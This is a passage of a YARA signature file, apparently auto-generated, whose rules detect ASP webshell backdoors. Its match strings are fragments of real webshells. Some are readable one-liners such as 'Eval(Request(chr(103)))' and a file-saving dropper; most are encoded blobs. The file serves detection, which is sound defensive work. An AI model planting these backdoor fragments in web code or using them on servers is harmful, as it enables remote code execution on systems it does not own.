        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d9270f4e7b9a647314515e2487a42c33fba032dc7c06e7ada4bfc6f7d3b5a4c0"
     strings:
        $s1 = "<%Eval(Request(chr(103))):Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.GetFile(Request.ServerVariables(\"PATH_" ascii
        $s2 = "<%Eval(Request(chr(103))):Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.GetFile(Request.ServerVariables(\"PATH_" ascii
        $s3 = "NSLATED\")):if  f.attributes <> 39 then:f.attributes = 39:end if%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_9885ee1952b5ad9f84176c9570ad4f0e32461c92
{
     meta:
        description = "asp - file 9885ee1952b5ad9f84176c9570ad4f0e32461c92.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4bcf28a1f9dc2b63bc55da432f71c5d9a04a35a34b8c04d73115ffe092fa310b"
     strings:
        $s1 = "/aGxk+ hMkOn,J@!9r\\,lVbLU'r[1t.`f*,#'J1nxD+.ELmt.c2c~#LE@*sPhP!/+MPr'0!/nDLJ~~al/k~JL0wmdd[rPmY~wG.DPE[,WwKDO~LJP4C7+~N" fullword ascii
        $s2 = "~@!(D@*J@#@&I\"?E/=-Gr+WR^Wswbkdkl6+-^WTw/Dl.Ymx[rb/m4nm0RYXO~P@!4M@*E@#@&]\"?EZ=wGb * 1W:wrb/dl6n'VGT-kml" fullword ascii
        $s3 = "x!rP[,-8mMV6P'PERzVAlHdb^VGAdWorU{!EPL~74^MV6P[,J /tmxL+hlddSWD9x!rP[,-8mMV6P'Pm@#@&JRp!GYm2UC(V+xTrP'P781Ds6PLPJ Hmajk+./dWLr" fullword ascii
        $s4 = "C^~~D+MYnmY4CVhW.+M:rUGk:,ODD=xhCd/KSKor~~C!YnDnnXTkUikEYGJKY4~,CTkUhl!YWdWGr:,lF+H=UKm//KJWTk~,C;YMxm:nkUik+OWdGoH~~C!4VnF" fullword ascii
        $s5 = "/z/Dn:K4%n1YJbla+a'r^K:q-mK: -mKh&-mG:Wu^Gs*u1G:+umKh{u1Ws%kmGhOuswDqu^wO+-VwOf-V2YWk^wOlu^wY+u^2YFuswD%ksaY,rlD" fullword ascii
        $s6 = "-(Ubhq{\"+S.kD+f-4YO29RmKU0@!4D@*E@#@&\"IUJ/)wKMWLDmhPwksnk-CnsbmGx'(UbK&{\"+hMkDn&'+.DKD sKoP@!8D@*J@#@&]]?rf`P\\+OnM" fullword ascii
        $s7 = "a+,z^~r[Dn5!+dYcWKDhvJ1:Nr#* /DNGEDR.nmNl^s@#@&D+k2Gxk+ch.kOnr@!&Y" fullword ascii
        $s8 = "@#@&XnK/Y2RUnx9`s+m\\nd*@#@&UnY,6n}jP&{xKY4kUL@#@&]IU~J@!0GUDPmGsKDxa6W60W6@*}|rnrn@!z6WUY@*@!8.@*@!A\"@*J@#@&+" fullword ascii
        $s9 = "'------------------------ www.7jyewu.cn ----------------------------" fullword ascii
        $s10 = ")PFcKWkkOrKx'9jDl.Y=P8R/KwHKW,KySf&2UN fjOmDY=P cnWkrOkKx{!lK+ :X2+{+):  /4lDdnD'Eo(+2F+r):qx{Ky I" fullword ascii
        $s11 = "YPXnKdY2PxP;DnCD+r(%+1Y`r\\j(tSyRpHJu:KKJ*@#@&idaKK/Yf }wnx,Ehrj:JBPJ4YD2)Jzq FRT ZRF=E[,wWMO~[rzk+^NdOr~~KM;+@#@&77XnWdO2Rj+" fullword ascii
        $s12 = "hjDDvk#Br(%nK/b[74/.d0)gn6D)?bUWWAx{Sn0OcUkU0K3xBSnUv?kUWK2U# +*@#@&Ax9Ps!x1OkKx@#@&@#@&@#@&@#@&Z^C/kPs&olNb:,srVnjbyn~wrV" fullword ascii
        $s13 = "xORLnD2s+snxDAz(9`BOsE# /Dz^+ 9kkwVmX{vxKxnBrJ~4M+0{:a@*@!4@*" fullword ascii
        $s14 = "+xBSkO~6lm@*@!0Kxm1^^mKD{a^4L^KV@*@!D[PLU@!OM?qxj&N@*U#~w1R8'ZPKKsK.Pb==)Ax[oAs2w.'?a2T^GVKVk+lAoX?)3awXslVG.{U)$L1W~K4n" fullword ascii
        $s15 = "odB,dk.+xvlB@*+@!J0GxD@*r[Jc1m:+LJ@!&l@*P@!4@*$@!&(@*Pr@#@&Uq'U('J@!l,t.+WxELC\\mdmMk2O=sEsswW.:vErJ'\"+hlY4`hCY4[E-r[J gl:" fullword ascii
        $s16 = "qGP_)~8wXiP~r\"92\"O$r:K6\\ Zrd6I=PaZT0!Z!pP/rJ6\")~aZT06!TI,Ar]9AIRK}K Z6dr\")P[!Z0!Z!IPwrHP sbt(SI)P7n.Nmxmi~A6]G2]O\"(M_KR" fullword ascii
        $s17 = "x[PbW@#@&o!x1YkKx,94tlUlT+.c*)2XnZ!Y+,jrx6WAxcJO.?#bUU5VUsG.s`EndDRh`\"n$Dx:Db?;^?D|f(?ODKDhc?+/D s{I+$;94UYMUb=rUT'vVaCN9B~^" fullword ascii
        $s18 = "'==yWVd2ms=U,^wsowsM'U?aT^W^WTU?P8O{UUy4+bot@*@!ON,[?@!ODzHm:nkk2VmW8%cf/2I?[=@*LU(sows?UU[swGVKDxU,4L^?U Z=kTtY{O[P4+JY[@*@!h" fullword ascii
        $s19 = "@#@&29rY}r#~{P2[rDr6.,R,FlANbYr}|{T@#@&2UN,qW@#@&k0,3NbYr}Fx!,Y4+U@#@&db'dkLE@!6WUO,0l^n{BA+([bxLkB,/k.+{vFEP^W^W.xM+N@*a@!J0W" fullword ascii
        $s20 = "xD+D@*B*IJ@#@&]IUJdnDKksnW!Y`rE[W1Es+UY C^V oKsNkEU kE4hrD`birEBcTZ!*iJ@#@&\"]?r@!&/1Dr2D@*J@#@&mm/+,f@#@&k+DP^'jnM\\nDc/D" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule c29639d90391d0601dff2d49e7f6938b927d8a4c
{
     meta:
        description = "asp - file c29639d90391d0601dff2d49e7f6938b927d8a4c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e0d80f119e263577a99b9ed1adc6eb43ed6a105973ee4e6ab7f9b7798a3492d7"
     strings:
        $s1 = "<%s.SaveToFile server.mappath(\"dama.asp\"),2%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule ff210a6a047eb063878a102a5554cea0738b4082
{
     meta:
        description = "asp - file ff210a6a047eb063878a102a5554cea0738b4082.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c6ea46505d80655f69f57d894c4566aaea791822898b3e972be7b180cb01ec12"
     strings:
        $s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s2 = "<%=\"<textarea name=dama cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
        $s3 = "<%ofso=\"scripting.filesystemobject\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_45c5d358b1e2a8dfa7843efc4048bda3a062d990
{
     meta:
        description = "asp - file 45c5d358b1e2a8dfa7843efc4048bda3a062d990.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "23abe892536ce4bd71ccae771d7cc7c85fe0151248349d6d226c93086b87160b"
     strings:
        $s1 = "VZ2ZE;wcYXd:oPZCx2-c2yxo;W:KXtVx7;W:VcwVZy{CwZy>'44E/oYco'=cfCo c2Co4<>c2oXo/< `&E7r&` - `&bLK&`>c2oXo<`=KSy" fullword ascii
        $s2 = "2rd=coxgCdawZH.))`\\`,bPX(2C5(c7xRc4Vx8.))c42xQ,`\\`,bPX(7tK(cExfjc7xR.wtr KcTo )2rd(coxg4a wKJ ``><2rd dX" fullword ascii
        $s3 = "`;)'`&Vo4&`'(oVc2x`=Vo4 KcTo ``><Vo4 dX:)Z7V,Vo4(wYC KZXoEKPd:KZXoEKPQ wKp:)x7x(oEcrymcoxcVE.VcSVc4=cTL ocj:)x7x(cTL KZXoEKPQ" fullword ascii
        $s4 = "`>';%WWD:oTtXcT;ZoPx:C-bZ2dVcSZ'=c2Co4 SXw<>'`&)W(2E&`:VZ2ZE-wKPZVtLExy;W:VcwVZy'=c2Co4 'VcoKcE'=KtX2x 'YfWWA'=TowXb wo<`r" fullword ascii
        $s5 = "4(E4J da:)D,X,Sbr(wXH=PV4:)Sbr(Kcl Zi D=X VZQ:``=oo:PV4,oo 7Xg:da wKp:KZXoEKPQ oXYp:Sbr=7Sd:KcTi``=Sbr da:)Sbr(7Sd KZXoEKPQ" fullword ascii
        $s6 = ">';)(c4Z2E.bZwKXb:ofXVE4xSxr'=LEX2EKZ #=dcVT x<>Vy<>Vy<>c7xVdX/<>'WWq'=oTtXcT 'WWO'=TowXb ''=EV4 'Z'=c7xK c7xVdX<`,`E`5rP" fullword ascii
        $s7 = ")`1RaGij_IGpB9`(4YZ&`?`&7x7&`/`&)c42xQ,`/`,)`mQRa_siJ8`(4YZ(7tK&)`iGm8_Gp3Gpj`(4YZ&`:`&)`pHJR_Gp3Gpj`(4YZ&`//:fooT`=Vyo" fullword ascii
        $s8 = ">AT<`,`EWu`5rP:O y5E:YPS:`>'PKc7'=44x2E 'fZo'=KtX2xS 'D'=oTtXcT wo<`r:O STX:`yofZo``=44x2E ``%WWD``=oTtXcT ``%WWD`dEC" fullword ascii
        $s9 = "))``,`?]'``[? =? ocjVxTE`,)W()c42xQ,`+]-b\\[?]'``[? =? ocjVxTE`,)(4Vcwxcsc4KZf4cG22Joct.cL7(YxX(cEx2fcGtcV(7XVi=44Y" fullword ascii
        $s10 = ")` >oKZd/<;zkD#&>O=cNX4 4tKXwycb=cExd oKZd<`,` >oKZd/<W>q=cNX4 4tKXwtKXb=cExd oKZd<`,`W`=o(dXX=cf5:)o(cf5 KZXoEKPd" fullword ascii
        $s11 = "``(7VXdKZE KVPocV:ofXVE4xSxr'=LEX2EKZ '7x'=44x2E`,`)```&)XrZ(YC2&```,```&7VE&```(4xo:ofXVE4xSxr`(fTY=XyX" fullword ascii
        $s12 = "server.scripttimeout=600" fullword ascii
        $s13 = "if session(\"uug\")=\"\" then:session(\"uug\")=mkc(uug):end if:uug=session(\"uug\"):execute uug:ixt(err):function mkc(blr):dim g" ascii
        $s14 = "if session(\"uug\")=\"\" then:session(\"uug\")=mkc(uug):end if:uug=session(\"uug\"):execute uug:ixt(err):function mkc(blr):dim g" ascii
        $s15 = "))``,`?]'``[? =? ocjVxTE`,)W()c42xQ,`+]-b\\[?]'``[? =? ocjVxTE`,oYcic4KZf4cG.cL7(YxX(cEx2fcGtcV(7XVi=44Y" fullword ascii
        $s16 = ")`+`,`kA|KZooPy`,`q=+4bZV.`&Cr4&`:^`(XVd&)`-`,`kA|KZooPy`,`q=-4bZV.`&Cr4&`)q>4bZV.`&Cr4&`(dX:^`(XVd=4tZ" fullword ascii
        $s17 = "`(cbw&`>')D-(Zt.CVZo4XT:ofXVE4xSxr'=dcVT x<>X2<>X2/<` & cEVPZj.VVp & ` :" fullword ascii
        $s18 = ")wcXdXwZ7o4x2coxw.2,)wcXdXwZ7o4x2coxw.2(cbw,W=))(bZK,wcXdXwZ7o4x2coxw.2,`w`(ddXwcoxw(dXX,WeD 5rP" fullword ascii
        $s19 = ")wcXdXwZ7o4x2coxw.d,)wcXdXwZ7o4x2coxw.d(cbw,W=))(bZK,wcXdXwZ7o4x2coxw.d,`w`(ddXwcoxw(dXX,WeD 5rP" fullword ascii
        $s20 = "`\\`&)`yt4`(KZX44c4=)`yt4`(KZX44c4 KcTo `\\`><)D,)`yt4`(KZX44c4(oTtXV wKx ``><)`yt4`(KZX44c4 dX" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them ) ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _02101ae41eb27864c6fe059f06a4603ceeb0673e_be01c06bd05740e91102b22d9abcc971c01ad659_0
{
     meta:
        description = "asp - from files 02101ae41eb27864c6fe059f06a4603ceeb0673e.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "60e4cfa6f7e6153035462a9df6ff53bdf96487b6ddba92c30136edd19abad2db"
        hash2 = "c3b029e9e7077164976a5f73399b07dd481ac41d524328f933a4cd62a36af679"
     strings:
        $s1 = "D-r1+RaANr~Jr'sW1l^[E-  '\\Ok|2\\DzdnM\\k^ncwANrSrJ'^W1lVLJ' R'R -7Yrma\\YJd+M\\k1n wSNr~EJ'sKmCVLE-cRw c-R w7Yr{a-Dzd" fullword ascii
        $s2 = "WGR4YsVE~EELVGmms[r-  'RRwm7Yr{a-D-2K/Dkx6Wc4YsVE~rJ'sKml^'J'RR'  -cR'{-Yrma\\O-aG/DkUWKRtOh^JSJr'^W^mVLJ-7Ybmw7Y&/" fullword ascii
        $s3 = "/n qDkDnPr@!Y9@*@!0KxDP^WsGM'8Vm^3@*@!8@*Lx4d2p[U4k2p[U(/aiJLW(%I1/ sb+s[k`k* 1m:+LE'x(/ai'x8dai'x(dwp@!&WKxY@*@!JY[@*r@#@&d7ix" fullword ascii
        $s4 = ".rD+~J@!&DN@*@!zDD@*@!zDC4^+@*J@#@&UG^k/D~',KD!n@#@&b0,+.D@!@*+ ~Y4nx,CCOm@#@&rW,+.DcU!:8" fullword ascii
        $s5 = "mOR:GDlsUk.+e8RZb#CFT!c!S~W#@#@&7f2P',qT!@#@&ifql~x,Fq!,RPGF@#@&if C~{PqFZ~ P9y@#@&df2l,xP8FTP P9f@#@&d\"n/aWxkn " fullword ascii
        $s6 = "/dR^U6JSJr'VKmCsLJ-  '{-Ybma\\O'l1m+k/c^x6JSJr[sG1lVLE-cR-c w{7Yb{2\\Owmm^+kdR1xWEBJJ'sKmCVLE'R 'Rc-Rc-|-Yb{2\\D-C^1+/k m" fullword ascii
        $s7 = "lh+LJ@!&m@*@!J8@*@!zY9@*@!zDD@*@!&YC8^+@*J,~P@#@&~~,PP~~,+UN,r6@#@&,P,PP,P,]+kwGxk+ o^E/4@#@&,PP,Hn6D@#@&P~P~^mVsP4CYm@#@&n" fullword ascii
        $s8 = "~E@!Dl(VnPAr9Y4'rEFZ!YEr@*J@#@&M+dwKUk+ SDbY+,J@!OD,\\CVboUxrJYK2Jr@*@!D[~mKVkwCxxEr EJ,CVboUxrJmnUD+.Jr@*r@#@&M+kwW" fullword ascii
        $s9 = "'&T~DX2+{WbVn,xm:+{0bs+E_r_E@*@!8M@*BpE@#@&D+k2Gxk+ch.kOn,J~P,~Eak[ bxxn._K\\S{dDDQE@!(D@*Eir@#@&M+dwKxdnchDbO+,J8r@#@&D" fullword ascii
        $s10 = "OP6m+~{P0+ wks+k@#@&d~,P,sWMPACm4PWFyP(U,0my@#@&iPP,~7@#@&d,P~P7r6P(xUODvj^Ck+`WqyRUlsn*~i1lk+`4l1V+9#bP@*PT~Dt+" fullword ascii
        $s11 = "YOAnbo4Y=8KV[pJr@*@!JY9@*@!JY.@*@!zOC(V+@*E@#@&D+k2Gxk+ch.kOn,JE@#@&.+kwGUk+RA.bYnPr@!JY[@*@!J0WM:@*@!zDD@*J@#@&.nkwW" fullword ascii
        $s12 = "PT@#@&0WM~k{!PDG~,@#@&iqWP(UkY.``/bU2chmkVabBPzlkC0{CMDmX`b#*~@*,!~K4+U@#@&ddtCk^|WM;hlkk,'~F@#@&i+UN,r0@#@&UnXY@#@&n" fullword ascii
        $s13 = "2aO@#@&P,~PhE4^r^Pwk^+Hlhn@#@&~P,~n!4sr1PZGUD+UY:za+@#@&P,PPhE(sk1P#l^En@#@&PP,~n!4Vb^~AbxmDzfCOm@#@&P,~PhE8sbmPJn" fullword ascii
        $s14 = "YnDrJ~AbNY4xJrF!ZYEJ@*@!DD@*@!O[@*J@#@&HCyKDOCvJ@!8@*,HCk^~~Wh(+MPFcF,8X,2BfAI~@!J4@*rb@#@&D+k2Gxk+ch.kOn,J@!Ym8V" fullword ascii
        $s15 = "UD+.rJ@*J@#@&Ym8VK&T`r@!8@*\"+l9rxTPsbsn/,4HP;/rUTPpHduK:n~qc!P8z,2BfA],ib@!z(@*J*@#@&zl./GVvJ@!WKD:,CmDkW" fullword ascii
        $s16 = "od~kkynxl@*H@!JWKxO@*P@!z0KxD@*@!JmnxD+.@*r@#@&AUN,?E(@#@&@#@&?!4~Ws[!`dYMb@#@&DndaWxdnch.kDn,J@!(D@*@!m" fullword ascii
        $s17 = "NPbW@#@&D+k2Gxk+ch.kOn,J@!zD[@*@!zO.@*@!zOC(Vn@*r@#@&ZC^V,tlDl@#@&@#@&Z)?AP+{,BPGG/HlPHC.lDP(X~2B9AI@#@&Mn/aWUd" fullword ascii
        $s18 = "xBlB~OHw+xvD+aYE@*,Pr^+,P@!bxa;Y,/OX^+xv1WVK.'[Zvw/$2EPkk\"+xvlB~xmh+{BC.m B~-mV;+{v8%v,YHw+{BDn6DB@*PmDCd" fullword ascii
        $s19 = ";P(XPAB92\"P,P~P~~,P~P,~P,P~~,PP~~,P~P,~,P~,P,PP,P,~P,P~P,P~~,PP,~P,PP,~~P,P,P~P~~,P~P,~P,P~~,PP~~,P~P,~,P~,P,PP,P,~P,J@#@&,P7." fullword ascii
        $s20 = "r[[WAUUY.[r@!z6WUO@*@!zO[@*@!&YM@*@!zOm4^+@*r@#@&~P,P~P,P^Ck+PrC/aJ@#@&~~P,P,P~P~~,In/aGxk+ " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 500KB and ( 8 of them ) ) or ( all of them )
}

rule _1bc7327f9d3dbff488e5b0b69a1b39dcb99b3399_bfe620457b308a149c3d741f2128918d483e8497_1
{
     meta:
        description = "asp - from files 1bc7327f9d3dbff488e5b0b69a1b39dcb99b3399.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "09c6235017dc71052b2761a8611fca3e2652d79f9ce3af98908aa67ad7b33e42"
        hash2 = "9751ca54cc6fb494b886d2f26c1cf1eb29a6217d0160b57658bf4cb0d6ea73ae"
     strings:
        $s1 = "dYcsG.s`JjnmD^t|WbVnA6DJ#@#@&i7d;lsV,?4GSbV^ok^+ vPhwhlDtb@#@&7i2UN,(0@#@&]]UPJ@!Om4s+,AbNO4'rJFZ!uEJ,4GD9+.xrJ!rEP1+V^2CN9k" fullword ascii
        $s2 = "e]A%PhLp%M0jl[BFMB=)_q'O%++%n|o _*!1y@*@*xx {Gv=I1s{\"m6%tWVSLz/gC6SLz%M0hWimEUE4em6%4xPhLolH%($YAXkYuzkLhS\"CmI9Ip?(mI5n\\BpAq" fullword ascii
        $s3 = "_R =bYsu/DxX4/.FgkYUX4/\"Fuk/N_B;hoz/AozZSo) ++y + y+ y ++y  ++y + y+y +y y  y yv]NXUh'&%akYEX%" fullword ascii
        $s4 = "@!J8@*@!&m@*@!zY9@*@!&YM@*E@#@&I]jr@!YM@*@!DNP4nro4Y{B+!v@*@!l~tMn0{B%C7l/^.bwO)U4KhoKV9+DvJrE[\"+KlDtc]KWYhCY4#[rEE#E@*@!4@*" fullword ascii
        $s5 = "dYv0k^nO6D#,K4+U@#@&d7di]+aW.O,'P]naW.YLE@!Y.@*@!DN@*r[Dn:a[E@!JY[@*@!YN@* ?m\\+@!&ON@*@!DN@*" fullword ascii
        $s6 = "\"qP2~E,P@!qgKj:PH)t2'/\\GPP5h3{K3oK@*J@#@&di7P,P]2Un6HU2Rq]q:2Pr@!j2d2;K~1)\\A'vK}6SEP@*@!}nK(6gP#bdiA'vE@* OO " fullword ascii
        $s7 = "jDD~{PrnDK\\b[+M'\\k1DGdK0YcB+DRrd39Accc!IP9CDl~?K;D1+xE,[PjnM\\nDc\\mwKmY4`J_?_ :94E#@#@&C[KZlDCVKoR;.nlD+,mGxUjDD@#@&1Gx" fullword ascii
        $s8 = "hW$A%Ph%62z6Ny-%S_B/Sn|F|nFv~$SY$Yt^ourXzZrXWb@$;Xo/3/~n||nFF`BASY5Y4sT]rXz/kHc)" fullword ascii
        $s9 = "3BvBR.SYF;$\"|QX;USt6W`6WSA0%S:Y6b;~*R~~z:^x%:ukz)E_1o$1od" fullword ascii
        $s10 = "D /M+lDnr(L+1OcJtk1DG/GWDRpHduK:nEb@#@&4 Ga+UPr!AKEBPrtYDw=&z8 {RZRT 8)J,'P6YwaG.Y,[,J&oGs9/;xJ;wmNhr" fullword ascii
        $s11 = "EvOHE.YSEY$uLD6jqeRBEA%k$YnL`Y]vEA$/DUX4sFR0x]%a$L:@$N.6?(ZBEJJrJrEJrBv]~!Y%.;0PfLM0?nf.hD3NkU:f;DX@$RN.0U|qvE" fullword ascii
        $s12 = "2VmmncwkVnKmY4~knM\\nMRtlwhlD4`r-E#LJwEBJJBq~8~F*'E@!Jl@*@!8D~&@*J@#@&,~P,Ynha'Ynha[E@!m~4Dn6'ELl7lk^DbwO)wEsswWDscJrJ[Mn2Vmm" fullword ascii
        $s13 = "aY~E_`1QBS$Ny50PY~!xS$bx]SNDMz8NeBAaX0$t]BX)%XBA%E?XYS!x~~%D6/]H\";/" fullword ascii
        $s14 = "P,PP,P,~P,P~P,I3jhr1U3RqIq:3~J@!z:2pK)]Ab@*J@#@&diP~~,PP~j:I}jA]IPx,JGIrhP:)Ad2~$x1/Dpf2;Jb\"2P@$6~qgK,2p2/~Unmrz/IAbP3,B" fullword ascii
        $s15 = "@!JsrgK@*@!A\"@*E@#@&P~~,PP,~P,PP,~~P,P,P~P~jA?jq}H`rn](r#'q@#@&P~P,~,P~,P,PP,P,~P,P~P,2JjA@#@&,~P,PP,~~P,P,P~P~~,P~P,]2Un6HU2R" fullword ascii
        $s16 = "\"(KABJ@#@&7d,P,P~P~jAK~IA/IA?iJ:P'~)Gr/rgHc2pAZ`K2v?:]p`2]5*P@#@&idP,~P,PP&o~IAZ\"2jjJPv!bP:u2gP@#@&idP~~,P~P\"3Un6g?AR" fullword ascii
        $s17 = "\"q:2BBBoK?:b]RGSJv*J@#@&7d,PP,~~Pzf}Z61H A(3Z`P2v?P]5j2]e*d@#@&,~,P~,P,PP,P,~P,P~P,P~~\"2?h61U2Rq](KAPr@!orHP,Z6S}]'\"29@*" fullword ascii
        $s18 = "Y4M 2tag!Ds'E'9WhlbU[r[dOHV+x+rJ@*@!Jrso@*@!z1+xD+M@*J@#@&]IUJ@!&DN@*@!&YM@*J@#@&(0,r(Kc!Sq*'EPr~K4+U@#@&IIjE@!Y.@*@!O9P4" fullword ascii
        $s19 = "Px~rOfAJ2:2f}\\)qgJ,[~\\8/MSWPL~J qKxZR! Tc!EPL~74/MS6P[,J,KWMYHW{J~',0Ya2WMYPL~-4;Dd0@#@&hO,'~JU(KAP\\)&1K3Hz1/2r~LP-(ZMS0@#@&" fullword ascii
        $s20 = "J@#@&idd,~P\"2?h6H?ARqI(K3~r@!(1hiK,1)\\A'n6]:PP5h3{K3oK,qf{?A].AI~.zSi3{F F !c!R8@*E@#@&Pid~P~~,P~P,~P\"2jK}1?3 qI(KA~rP~Upd" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _8f10120aea3f81623c7d17eba77bf728ab93938f_9302b3a7853e0164311a8574867ad15dc25088c0_caff3acf1c2b599322d3ce547b8235a847dff373__2
{
     meta:
        description = "asp - from files 8f10120aea3f81623c7d17eba77bf728ab93938f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2136acae56b7f6cf4be565f6b85699fb5358533bfecfa51fd713159baca2c1cd"
        hash2 = "9b43c1241705f46b666fd802a9e9b0e3e30ae38d16af6170ed2140d4134da819"
        hash3 = "e913f73817415b34eafdce87433d1905f743f4141da10edfa4d8e6e74c439a4f"
        hash4 = "52a45d5e40908a56faa6898c6858f2f84a86142df562525b6af9232c5707b351"
     strings:
        $s1 = "axJ1WsFkmGhyu^Wsfu1Wh*-mWhX-mG:+k1WhFu1W:Ru1G:OuswDFksaY -swD&u^2Oc-VaYXus2DvkVaOG-V2ORuV2OOJ@#@&MU9wnX'kwVbYv2+X~Eur#c." fullword ascii
        $s2 = "x@#@&K8RKWkkOrKxP{~f&2x9~lP:FcZGwzPKPP B9?Dl.O fq3U9Of@#@&PyRKK/bYkKx,xPZPlP:  PHw+,xPy@#@&:+ Z4lM/nY~xro8 2q r@#@&jw.Px~:  I" fullword ascii
        $s3 = "NbD+1Y,;D^@#@&+^/n@#@&LJ@!8D@*@!4M@*@!4M@*@!4@*@![r7PCVbLx{mnUD+D@*@!6WUY,dbyn{BlBP1W^GD{B.+9B@*Km//qGD9P2M.GDe@!J0GxO~r[;/" fullword ascii
        $s4 = "PxPERG2J2:3f}H)(gJP'~74/DdW,[~rO&n'ZRZ !c!EPLP-8;DS6~[,JPhG.YgW{J~[~WDw2WMOPLP-8;DSW@#@&:OP{~r?(:2,Hb&1:31z1/2rP'~74ZMJ0@#@&x" fullword ascii
        $s5 = "Esl-~EYr:(;?E'nhmxPvOb:8Ekv{+2HY,YEaxb@!@*9'[k,B+v{xladVKmP9O@!@*E+^N[khv{xLk^C\\,B.nDx+^v{xLk^C,DO@!@*MYz@!@*9Oz@!" fullword ascii
        $s6 = "6OGbxYn.vZjYMc_+avnKDYzDMCXvFb#*[/jDD`_n6vnWMO)DMlH`T#bb*@#@&2^d+,@#@&%r2D.GM\"~ZmUEY~\"+mN\"r@#@&3x9P(0@#@&3U9Ps!UmDkW" fullword ascii
        $s7 = "@!zm@*~J@#@&dr{/kLE@!mPtMnW'ELm\\C/^.bwO)w;V^sG.s`JEELInnmO4`KmY4[J'JLJRglh+*[EEr~Jr3NbYsbsnJr#EP^VCdk'vlsvPDkOs" fullword ascii
        $s8 = "EL+W@#@&%P1Na'r@!l~4M+W'E%m\\CkmMkwD)w;V^sGDs`EE'--' -'J[\"nKlDtv?n/drKxcJwGV9+.KmYtEbLJE#LE'x;^Jr~Jr1" fullword ascii
        $s9 = "+~Y4nx@#@&OaDRmsGk+@#@&6dK( V+Dsk^+vok^+iD^# )DYDb8ED+/{f+@#@&k6P)w2sbmCYbGxvDn5!+/Ocrn.Wwr^+E*[rZtmDrb'8POt" fullword ascii
        $s10 = "bW~`9W1Eh+UOconYAs+s+UO~Xq[ck# /Dz^+ 9kkwVmX{xJrJE#PNG^!:+" fullword ascii
        $s11 = "'&b:mo+kzcC/a[Wk^+UCs+FEI@!J/mMr2Y@*J@#@&nx[~kE8@#@&@#@&UE8~t+/dCT+c/DCD+Ss/T~0^lTb@#@&LE@!:b$JAPhb[Y4'cRT~4KD9+.'T~mVro" fullword ascii
        $s12 = "~[,!Tq,zPbTZF~e,b*c+ZF,ePW Zq`,z~+.kjn4Y`vakwP',n\"kU+4KO+Ll,xnt:~#W Tq,eP*+ZF~e,*y!qvP@!P+.kUntDP[xzPb*y!F,MPW !8c~'@*P" fullword ascii
        $s13 = "@!J4@*@!Jl@*@!JKf@*@!K\"Pm^Cd/{K~K9@*~@!wr]H,CmDkGU{P:nO4W['hGkY@*r@#@&LJ@!KG~l^kLx{:r[9V+@*@!A@*" fullword ascii
        $s14 = "@!&:f@*@!&K\"@*J@#@&~PwWMP3l^4,f.k7nA,kU~w?r 9Mk-+k@#@&LE,@!:IPmVbLx{:rN9Vn~1Vlkd':AKG@*@!s}ItPCmOrKxxgz^YbWUxUmlU9Mk-+L9Mk-" fullword ascii
        $s15 = "xqJ,[,\\8Z.J6P'PrRImYrGkZDn[bYx!r~LP-(ZMS0,[,EO5EGYmZ;.M+xDx!rP[,-8ZMS6P'PER5EGYm\\lXkh;s'!E~LP-4;.d0~LP|@#@&,P,~P,P~J HCr" fullword ascii
        $s16 = "HGEkn}\\nM'rJY4kk /DXs+cm;.kWD{vtmxN8vEJ,YHwn'8;DYGx,-l^EnxEqxWGM:CYbG" fullword ascii
        $s17 = ".)8waPkWsr9PJL$WMN+M/GVKDLJIwC[9kUo 8WDYGh=cwav@*J@#@&U({?(LqkqmK`rE~r0GV9+. Tk0rSJZJ#@#@&dk{/b[E@!C~4Dn0{vLm\\Cd1Dk2O=?4WSoKV[" fullword ascii
        $s18 = "D. 1V+m.@#@&k0,6$9c?Dl.YPza+xJr~Y4+U@#@&?qxj&[E@!D.@*@!O9P4+kTtDxJr TJrPr[{N@*LU4kwir'G4NRglh+'E@!zON@*@!Y9Pr[{N@*'U(/2i" fullword ascii
        $s19 = "9kM'^)'-E~LP\\(/Dd0PL~EOdWTkUHndwks+{EPLP-8;DSW~LPEOGrkl8^+{!J,[,-4;DJ0,[~E I+^KlDt/{qEPLP74/DJW,[~{@#@&P,P~~,PPERg+nNUn1E." fullword ascii
        $s20 = "Y~W8%w/G'gGY4kUL@#@&P3U9PjE(@#@&Po!x1YkKx,j+mD^t@#@&~~wWV9nDk'/asrYvsKV[+.dBJSJ*@#@&,PWsmo'rUkY.`0nHhGMNBJ-r#,GD,kU/DDcV" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _ca1ea4d245d09fcb6a71f4295294ca1568922715_da38c65ec34882a24f47e9ccc55a9f2222ea7a81_3
{
     meta:
        description = "asp - from files ca1ea4d245d09fcb6a71f4295294ca1568922715.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
